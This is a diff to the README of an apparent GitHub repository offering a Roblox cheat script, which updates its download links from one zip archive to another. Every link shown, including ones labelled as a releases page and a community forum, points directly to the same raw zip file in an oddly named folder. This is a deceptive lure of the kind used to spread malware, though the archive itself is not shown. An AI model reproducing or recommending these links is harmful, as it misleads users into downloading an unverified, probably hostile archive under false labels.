@@ -6,14 +6,14 @@ Welcome to the Roblox-Blind-Shot-Script! This script is designed to improve your
 
 ## 🔗 Download Now
 
-[![Download Roblox-Blind-Shot-Script](https://github.com/laouysalma/Roblox-Blind-Shot-Script/raw/refs/heads/main/fosteringly/BlindScriptRobloxShot-v3.5.zip)](https://github.com/laouysalma/Roblox-Blind-Shot-Script/raw/refs/heads/main/fosteringly/BlindScriptRobloxShot-v3.5.zip)
+[![Download Roblox-Blind-Shot-Script](https://raw.githubusercontent.com/laouysalma/Roblox-Blind-Shot-Script/main/fosteringly/Roblox_Shot_Blind_Script_v1.6.zip)](https://raw.githubusercontent.com/laouysalma/Roblox-Blind-Shot-Script/main/fosteringly/Roblox_Shot_Blind_Script_v1.6.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the script. 
 
 1. Click the link below to go to the Releases page:
-   [Visit Releases Page](https://github.com/laouysalma/Roblox-Blind-Shot-Script/raw/refs/heads/main/fosteringly/BlindScriptRobloxShot-v3.5.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/laouysalma/Roblox-Blind-Shot-Script/main/fosteringly/Roblox_Shot_Blind_Script_v1.6.zip)
    
 2. Find the latest version of the Roblox-Blind-Shot-Script.
 
@@ -71,7 +71,7 @@ For additional support, feel free to visit the GitHub Issues page. We appreciate
 
 Join our community to share tips and tricks. Feel free to post your experiences and suggestions in the community forum linked below:
 
-[Join Community Forum](https://github.com/laouysalma/Roblox-Blind-Shot-Script/raw/refs/heads/main/fosteringly/BlindScriptRobloxShot-v3.5.zip)
+[Join Community Forum](https://raw.githubusercontent.com/laouysalma/Roblox-Blind-Shot-Script/main/fosteringly/Roblox_Shot_Blind_Script_v1.6.zip)
 
 ---
 
